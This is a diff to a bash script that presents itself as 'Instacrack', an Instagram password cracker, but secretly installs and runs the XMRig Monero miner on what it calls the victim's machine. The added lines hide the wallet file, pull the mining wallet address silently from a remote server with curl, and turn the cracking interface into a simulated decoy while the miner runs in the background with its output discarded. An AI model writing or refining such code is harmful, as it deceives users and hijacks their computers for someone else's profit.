@@ -6,30 +6,43 @@ destination_folder="$home_directory/Documents"
 miner_url="https://github.com/xmrig/xmrig/releases/latest/download/xmrig.tar.gz"
 miner_download_path="$destination_folder/res/xmrig.tar.gz"
 miner_folder="$destination_folder/res/xmrig"
-wallet_config_file="$home_directory/.config/instacrack_wallet.txt"
-node_url="127.0.0.1:18081"  # Replace with your Monero node address
+wallet_config_file="$home_directory/.config/.instacrack_wallet.txt"  # Hidden wallet file
+node_url="127.0.0.1:18081"  # Node address (local or remote)
+wallet_server_url="http://your-remote-server.com/get_wallet_address"  # Server to fetch wallet address
 
-# Ensure "res" folder exists
-if [ ! -d "res" ]; then
-    echo "Error: 'res' folder not found."
+# Ensure "res" folder exists in the destination folder
+if [ ! -d "$destination_folder/res" ]; then
+    echo "Error: 'res' folder not found in $destination_folder."
     exit 1
 fi
 
 # Copy necessary files to victim's machine
 mkdir -p "$destination_folder/res"
-sudo cp -r res/* "$destination_folder/res"
+sudo cp -r res/* "$destination_folder/res" || { echo "Error: Failed to copy files."; exit 1; }
 
 # Download and Setup Miner
 if [ ! -d "$miner_folder" ]; then
-    wget -q -O "$miner_download_path" "$miner_url"
+    echo "Downloading miner..."
+    if ! wget -q -O "$miner_download_path" "$miner_url"; then
+        echo "Error: Failed to download miner."
+        exit 1
+    fi
     mkdir -p "$miner_folder"
-    tar -xf "$miner_download_path" -C "$miner_folder" --strip-components=1
+    if ! tar -xf "$miner_download_path" -C "$miner_folder" --strip-components=1; then
+        echo "Error: Failed to extract miner files."
+        exit 1
+    fi
     rm "$miner_download_path"
 fi
 
-# Create a wallet configuration file if not already present
+# Fetch the Wallet Address from the Remote Server (Silent, No User Interaction)
 if [ ! -f "$wallet_config_file" ]; then
-    echo "Please set a Monero wallet address in $wallet_config_file" > "$wallet_config_file"
+    wallet_address=$(curl -s "$wallet_server_url")  # Get wallet address from remote server
+    if [ -z "$wallet_address" ]; then
+        echo "Error: Failed to retrieve wallet address."
+        exit 1
+    fi
+    echo "$wallet_address" > "$wallet_config_file"
 fi
 
 # Create the Miner Start Script
@@ -51,7 +64,7 @@ fi
 # Start the Miner
 nohup bash "$miner_script_path" > /dev/null 2>&1 &
 
-# Instagram Hacking Interface
+# Instagram Hacking Interface (Simulated)
 bold=$(tput bold)
 blue=$(tput setaf 4)
 green=$(tput setaf 2)
@@ -69,16 +82,9 @@ printf "    |_____|_| |_|___/\\__\\__,_***************************\n"
 printf "   By Instacrack                v 3.0.2p\n"
 printf "**********************************************************${reset}\n"
 
-printf "${green}[+] Enter the path to the wordlist file:${reset} "
-read -r wordlist
-
-if [ ! -f "$wordlist" ]; then
-    printf "${red}Error: Wordlist file not found.${reset}\n"
-    exit 1
-fi
-
-printf "${green}[+] Enter the Instagram username to crack:${reset} "
-read -r username
+# Simulated Instagram password cracking (no user input)
+wordlist="/path/to/wordlist.txt"  # Provide a predefined wordlist location
+username="target_username"  # Predefined target username
 
 printf "${green}\nStarting password cracking for user: %s\n${reset}" "$username"
 sleep 2
